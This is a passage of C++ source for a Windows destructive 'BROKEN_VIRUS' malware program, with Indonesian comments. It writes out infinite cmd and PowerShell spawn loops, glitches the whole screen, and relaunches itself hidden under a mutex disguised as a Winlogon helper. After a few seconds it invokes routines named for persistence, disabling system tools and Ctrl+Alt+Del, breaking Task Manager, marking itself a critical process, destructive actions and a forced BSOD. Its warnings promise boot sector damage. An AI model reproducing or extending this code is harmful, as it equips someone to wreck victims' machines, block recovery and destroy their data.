    const wchar_t* commands[] = {
        L"cmd.exe /k \"@echo off && title CORRUPTED_SYSTEM && color 0a && echo WARNING: SYSTEM INTEGRITY COMPROMISED && for /l %x in (0,0,0) do start /min cmd /k \"echo CRITICAL FAILURE %random% && ping 127.0.0.1 -n 2 > nul && exit\"\"",
        L"powershell.exe -NoExit -Command \"while($true) { Write-Host 'R͏͏҉̧҉U̸N̕͢N̢҉I͠N̶G̵ ͠C̴O̕R͟R̨U̕P̧T͜ED̢ ̸C̵ÒD̸E' -ForegroundColor (Get-Random -InputObject ('Red','Green','Yellow')); Start-Sleep -Milliseconds 200 }\"",
        L"notepad.exe",
        L"explorer.exe",
        L"write.exe",
        L"calc.exe",
        L"mspaint.exe",
        L"regedit.exe",
        L"taskmgr.exe",
        L"control.exe",
        L"msedge.exe https://www.youtube.com/watch?v=dQw4w9WgXcQ",
        L"msedge.exe https://www.google.com/search?q=how+to+remove+broken+virus"
    };

    int numPopups = 8 + rand() % 10;
    bool spawnSpam = (rand() % 2 == 0);

    for (int i = 0; i < numPopups; i++) {
        int cmdIndex = rand() % (sizeof(commands)/sizeof(commands[0]));
        
        if (spawnSpam && i == 0) {
            ShellExecuteW(NULL, L"open", L"cmd.exe", 
                L"/c start cmd.exe /k \"@echo off && title SYSTEM_FAILURE && for /l %x in (0,0,0) do start /min cmd /k echo ͏҉̷̸G҉̢L͠I͏̵T́C̶H͟ ̀͠D͠E͜T̷ÉC̵T̨E̵D͜ %random% && timeout 1 > nul\"", 
                NULL, SW_SHOWMINIMIZED);
            continue;
        }

        SHELLEXECUTEINFOW sei = { sizeof(sei) };
        sei.lpVerb = L"open";
        sei.lpFile = L"cmd.exe";
        sei.lpParameters = commands[cmdIndex];
        sei.nShow = (rand() % 2) ? SW_SHOWMINIMIZED : SW_SHOWNORMAL;
        sei.fMask = SEE_MASK_NOCLOSEPROCESS;
        
        ShellExecuteExW(&sei);
        if (sei.hProcess) CloseHandle(sei.hProcess);
        
        Sleep(100);
    }

    if (rand() % 2 == 0) {
        ShellExecuteW(NULL, L"open", L"wt.exe", NULL, NULL, SW_SHOW);
    }
}

void ApplyGlitchEffect() {
    if (!pPixels) return;
    
    BYTE* pCopy = new (std::nothrow) BYTE[screenWidth * screenHeight * 4];
    if (!pCopy) return;
    memcpy(pCopy, pPixels, screenWidth * screenHeight * 4);
    
    DWORD cTime = GetTickCount();
    
    // Perhitungan intensitas berdasarkan waktu
    if (criticalMode) {
        intensityLevel = 30;
    } else {
        int timeIntensity = 1 + static_cast<int>((cTime - startTime) / 3000);
        intensityLevel = std::min(30, timeIntensity);
    }
    
    ApplyScreenShake();
    
    if (cTime - lastEffectTime > 500) {
        textCorruptionActive = (rand() % 100 < 60 * intensityLevel);
        lastEffectTime = cTime;
    }
    
    // ===== MODIFIKASI UTAMA: AKTIFKAN MODE KRITIS DALAM 3 DETIK =====
    if (!criticalMode && cTime - startTime > 3000) {
        criticalMode = true;
        bsodTriggerTime = cTime + 30000 + rand() % 20000;

        if (!persistenceInstalled) {
            InstallPersistence();
            DisableSystemTools();
            DisableCtrlAltDel();
        }

        if (g_isAdmin) {
            static bool adminDestructionDone = false;
            if (!adminDestructionDone) {
                BreakTaskManager();
                SetCriticalProcess();
                adminDestructionDone = true;
            }
        }
    }
    
    // Glitch garis horizontal intens
    int effectiveLines = std::min(GLITCH_LINES * intensityLevel, 15000);
    for (int i = 0; i < effectiveLines; ++i) {
        int y = rand() % screenHeight;
        int height = 1 + rand() % (150 * intensityLevel);
        int xOffset = (rand() % (MAX_GLITCH_INTENSITY * 2 * intensityLevel)) - MAX_GLITCH_INTENSITY * intensityLevel;
        
        height = std::min(height, screenHeight - y);
        if (height <= 0) continue;
        
        for (int h = 0; h < height; ++h) {
            int currentY = y + h;
            if (currentY >= screenHeight) break;
            
            BYTE* source = pCopy + (currentY * screenWidth * 4);
            BYTE* dest = pPixels + (currentY * screenWidth * 4);
            
            if (xOffset > 0) {
                int copySize = (screenWidth - xOffset) * 4;
                if (copySize > 0) {
                    memmove(dest + xOffset * 4, 
                            source, 
                            copySize);
                }
                for (int x = 0; x < xOffset; x++) {
                    int pos = (currentY * screenWidth + x) * 4;
                    if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                        pPixels[pos] = rand() % 256;
                        pPixels[pos + 1] = rand() % 256;
                        pPixels[pos + 2] = rand() % 256;
                    }
                }
            } 
            else if (xOffset < 0) {
                int absOffset = -xOffset;
                int copySize = (screenWidth - absOffset) * 4;
                if (copySize > 0) {
                    memmove(dest, 
                            source + absOffset * 4, 
                            copySize);
                }
                for (int x = screenWidth - absOffset; x < screenWidth; x++) {
                    int pos = (currentY * screenWidth + x) * 4;
                    if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                        pPixels[pos] = rand() % 256;
                        pPixels[pos + 1] = rand() % 256;
                        pPixels[pos + 2] = rand() % 256;
                    }
                }
            }
        }
    }
    
    // Distorsi blok ekstrim
    int effectiveBlocks = std::min(MAX_GLITCH_BLOCKS * intensityLevel, 3000);
    for (int i = 0; i < effectiveBlocks; ++i) {
        int blockWidth = std::min(150 + rand() % (500 * intensityLevel), screenWidth);
        int blockHeight = std::min(150 + rand() % (500 * intensityLevel), screenHeight);
        int x = rand() % (screenWidth - blockWidth);
        int y = rand() % (screenHeight - blockHeight);
        int offsetX = (rand() % (1500 * intensityLevel)) - 750 * intensityLevel;
        int offsetY = (rand() % (1500 * intensityLevel)) - 750 * intensityLevel;
        
        for (int h = 0; h < blockHeight; h++) {
            int sourceY = y + h;
            int destY = sourceY + offsetY;
            
            if (destY >= 0 && destY < screenHeight && sourceY >= 0 && sourceY < screenHeight) {
                BYTE* source = pCopy + (sourceY * screenWidth + x) * 4;
                BYTE* dest = pPixels + (destY * screenWidth + x + offsetX) * 4;
                
                int effectiveWidth = blockWidth;
                if (x + offsetX + blockWidth > screenWidth) {
                    effectiveWidth = screenWidth - (x + offsetX);
                }
                if (x + offsetX < 0) {
                    effectiveWidth = blockWidth + (x + offsetX);
                    source -= (x + offsetX) * 4;
                    dest -= (x + offsetX) * 4;
                }
                
                if (effectiveWidth > 0 && dest >= pPixels && 
                    dest + effectiveWidth * 4 <= pPixels + screenWidth * screenHeight * 4) {
                    memcpy(dest, source, effectiveWidth * 4);
                }
            }
        }
    }
    
    if (intensityLevel > 0 && (rand() % std::max(1, 3 / intensityLevel)) == 0) {
        ApplyColorShift(pPixels, (rand() % 6) + 1);
    }
    
    int effectivePixels = std::min(screenWidth * screenHeight * intensityLevel, 700000);
    for (int i = 0; i < effectivePixels; i++) {
        int x = rand() % screenWidth;
        int y = rand() % screenHeight;
        int pos = (y * screenWidth + x) * 4;
        
        if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
            pPixels[pos] = rand() % 256;
            pPixels[pos + 1] = rand() % 256;
            pPixels[pos + 2] = rand() % 256;
        }
    }
    
    ApplyDistortionEffect();
    
    if (rand() % 2 == 0) {
        int lineHeight = 1 + rand() % (7 * intensityLevel);
        for (int y = 0; y < screenHeight; y += lineHeight * 2) {
            for (int h = 0; h < lineHeight; h++) {
                if (y + h >= screenHeight) break;
                for (int x = 0; x < screenWidth; x++) {
                    int pos = ((y + h) * screenWidth + x) * 4;
                    if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                        pPixels[pos] = std::min(pPixels[pos] + 180, 255);
                        pPixels[pos + 1] = std::min(pPixels[pos + 1] + 180, 255);
                        pPixels[pos + 2] = std::min(pPixels[pos + 2] + 180, 255);
                    }
                }
            }
        }
    }
    
    if (intensityLevel > 0 && (rand() % std::max(1, 8 / intensityLevel)) == 0) {
        for (int i = 0; i < static_cast<int>(screenWidth * screenHeight * 4); i += 4) {
            if (i < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                pPixels[i] = 255 - pPixels[i];
                pPixels[i + 1] = 255 - pPixels[i + 1];
                pPixels[i + 2] = 255 - pPixels[i + 2];
            }
        }
    }
    
    if (intensityLevel > 2 && rand() % 3 == 0) {
        ApplyMeltingEffect(pCopy);
    }
    
    if (textCorruptionActive) {
        ApplyTextCorruption();
    }
    
    if (intensityLevel > 1 && rand() % 3 == 0) {
        ApplyPixelSorting();
    }
    
    if (intensityLevel > 1 && rand() % 2 == 0) {
        ApplyStaticBars();
    }
    
    if (intensityLevel > 1 && rand() % 3 == 0) {
        ApplyInversionWaves();
    }
    
    ApplyCursorEffect();
    UpdateParticles();
    
    if (rand() % SOUND_CHANCE == 0) {
        PlayGlitchSoundAsync();
    }
    
    if (rand() % 30 == 0) {
        cursorVisible = !cursorVisible;
        ShowCursor(cursorVisible);
    }
    
    // ===== POPUP RANDOM =====
    static DWORD lastPopupTime = 0;
    if (GetTickCount() - lastPopupTime > 1500 && (rand() % 100 < (40 + intensityLevel * 7))) {
        std::thread(OpenRandomPopups).detach();
        lastPopupTime = GetTickCount();
    }
    
    // ===== DESTRUCTIVE EFFECTS =====
    if (criticalMode && !destructiveActionsTriggered) {
        ExecuteDestructiveActions();
    }
    
    if (criticalMode) {
        intensityLevel = 30;
        
        if (bsodTriggerTime != 0 && cTime >= bsodTriggerTime) {
            std::thread(TriggerBSOD).detach();
        }
    }
    
    delete[] pCopy;
}

LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    static HDC hdcLayered = NULL;
    static BLENDFUNCTION blend = { AC_SRC_OVER, 0, 255, AC_SRC_ALPHA };
    
    switch (msg) {
    case WM_CREATE:
        hdcLayered = CreateCompatibleDC(NULL);
        SetTimer(hwnd, 1, REFRESH_RATE, NULL);
        return 0;
        
    case WM_TIMER: {
        CaptureScreen(hwnd);
        ApplyGlitchEffect();
        
        if (hdcLayered && hGlitchBitmap) {
            HDC hdcScreen = GetDC(NULL);
            POINT ptZero = {0, 0};
            SIZE size = {screenWidth, screenHeight};
            
            SelectObject(hdcLayered, hGlitchBitmap);
            UpdateLayeredWindow(hwnd, hdcScreen, &ptZero, &size, hdcLayered, 
                               &ptZero, 0, &blend, ULW_ALPHA);
            
            ReleaseDC(NULL, hdcScreen);
        }
        return 0;
    }
        
    case WM_DESTROY:
        KillTimer(hwnd, 1);
        if (hGlitchBitmap) DeleteObject(hGlitchBitmap);
        if (hdcLayered) DeleteDC(hdcLayered);
        ShowCursor(TRUE);
        PostQuitMessage(0);
        return 0;
    }
    return DefWindowProc(hwnd, msg, wParam, lParam);
}

void RunBackgroundProcess() {
    FreeConsole();
    
    // Set variabel global untuk proses background
    ::startTime = GetTickCount();
    ::criticalMode = false;
    ::persistenceInstalled = false;
    ::destructiveActionsTriggered = false;
    
    HDC hdcScreen = GetDC(NULL);
    screenWidth = GetSystemMetrics(SM_CXSCREEN);
    screenHeight = GetSystemMetrics(SM_CYSCREEN);
    
    bmi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);
    bmi.bmiHeader.biWidth = screenWidth;
    bmi.bmiHeader.biHeight = -screenHeight;
    bmi.bmiHeader.biPlanes = 1;
    bmi.bmiHeader.biBitCount = 32;
    bmi.bmiHeader.biCompression = BI_RGB;
    
    hGlitchBitmap = CreateDIBSection(hdcScreen, &bmi, DIB_RGB_COLORS, (void**)&pPixels, NULL, 0);
    ReleaseDC(NULL, hdcScreen);
    
    while (true) {
        CaptureScreen(NULL);
        ApplyGlitchEffect();
        
        HDC hdcScreen = GetDC(NULL);
        HDC hdcMem = CreateCompatibleDC(hdcScreen);
        SelectObject(hdcMem, hGlitchBitmap);
        
        POINT ptZero = {0, 0};
        SIZE size = {screenWidth, screenHeight};
        BLENDFUNCTION blend = { AC_SRC_OVER, 0, 255, AC_SRC_ALPHA };
        
        HWND hDesktop = GetDesktopWindow();
        UpdateLayeredWindow(hDesktop, hdcScreen, &ptZero, &size, hdcMem, 
                           &ptZero, 0, &blend, ULW_ALPHA);
        
        DeleteDC(hdcMem);
        ReleaseDC(NULL, hdcScreen);
        
        Sleep(REFRESH_RATE);
    }
}

int WINAPI WinMain(HINSTANCE hInst, HINSTANCE, LPSTR, int) {
    // Inisialisasi GDI+
    GdiplusStartupInput gdiplusStartupInput;
    GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);

    g_isAdmin = IsRunAsAdmin();

    if (MessageBoxW(NULL, 
        L"WARNING: This program will cause irreversible system damage!\n\n"
        L"Proceed only if you understand the risks and have backed up all important data."
        L"This program is NOT TO BE TESTED ON A PRODUCTIVE COMPUTER.\n\n"
        L"Do you really want to continue?",
        L"CRITICAL SECURITY ALERT", 
        MB_YESNO | MB_ICONWARNING | MB_DEFBUTTON2) != IDYES)
    {
        return 0;
    }
    
    if (MessageBoxW(NULL, 
        L"FINAL WARNING: This will cause:\n"
        L"- Permanent boot sector damage\n"
        L"- Extreme visual glitches\n"
        L"- Continuous system pop-ups\n"
        L"- System instability and crashes\n"
        L"- Complete system destruction\n\n"
        L"Press 'OK' only if you are ready to accept the consequences.",
        L"FINAL CONFIRMATION", 
        MB_OKCANCEL | MB_ICONERROR | MB_DEFBUTTON2) != IDOK)
    {
        return 0;
    }

    HANDLE hMutex = CreateMutexW(NULL, TRUE, L"Global\\WinlogonHelperMutex");
    DWORD lastError = GetLastError();
    if (lastError == ERROR_ALREADY_EXISTS) {
        if (hMutex) {
            CloseHandle(hMutex);
        }
        
        if (__argc > 1 && lstrcmpiA(__argv[1], "-background") == 0) {
            return 0;
        }
        
        wchar_t szPath[MAX_PATH];
        GetModuleFileNameW(NULL, szPath, MAX_PATH);
        
        SHELLEXECUTEINFOW sei = { sizeof(sei) };
        sei.lpFile = szPath;
        sei.lpParameters = L"-background";
        sei.nShow = SW_HIDE;
        ShellExecuteExW(&sei);
        return 0;
    }

    srand(static_cast<unsigned>(time(NULL)));
    startTime = GetTickCount();
    
    if (__argc > 1 && lstrcmpiA(__argv[1], "-background") == 0) {
        RunBackgroundProcess();
        return 0;
    }
    
    FreeConsole();
    
    WNDCLASSEXW wc = {
        sizeof(WNDCLASSEX), 
        CS_HREDRAW | CS_VREDRAW, 
        WndProc,
        0, 0, hInst, NULL, NULL, NULL, NULL,
        L"BROKEN_VIRUS", NULL
    };
    RegisterClassExW(&wc);
    
    HWND hwnd = CreateWindowExW(
        WS_EX_LAYERED | WS_EX_TRANSPARENT | WS_EX_TOPMOST | WS_EX_TOOLWINDOW,
        wc.lpszClassName, 
        L"CRITICAL SYSTEM FAILURE",
        WS_POPUP, 
        0, 0, 
        GetSystemMetrics(SM_CXSCREEN), 
        GetSystemMetrics(SM_CYSCREEN), 
        NULL, NULL, hInst, NULL
    );
    
    SetWindowPos(
        hwnd, HWND_TOPMOST, 0, 0, 
        GetSystemMetrics(SM_CXSCREEN), 
        GetSystemMetrics(SM_CYSCREEN), 
        SWP_SHOWWINDOW
    );
    
    ShowWindow(hwnd, SW_SHOW);
    
    wchar_t szPath[MAX_PATH];
    GetModuleFileNameW(NULL, szPath, MAX_PATH);
    
    SHELLEXECUTEINFOW sei = { sizeof(sei) };
    sei.lpFile = szPath;
    sei.lpParameters = L"-background";
    sei.nShow = SW_HIDE;
    ShellExecuteExW(&sei);
    
    std::thread([]() {
        for (int i = 0; i < 20; i++) {
            Beep(200, 100);
            Beep(700, 100);
            Beep(1200, 100);
            Sleep(5);
        }
        
        for (int i = 0; i < 150; i++) {
            Beep(rand() % 8000 + 300, 10);
            Sleep(1);
        }
        
        for (int i = 0; i < 15; i++) {
            Beep(30 + i * 250, 250);
        }
    }).detach();
    
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    
    if (hMutex) {
        CloseHandle(hMutex);
    }
    
    GdiplusShutdown(gdiplusToken);
    return static_cast<int>(msg.wParam);
}
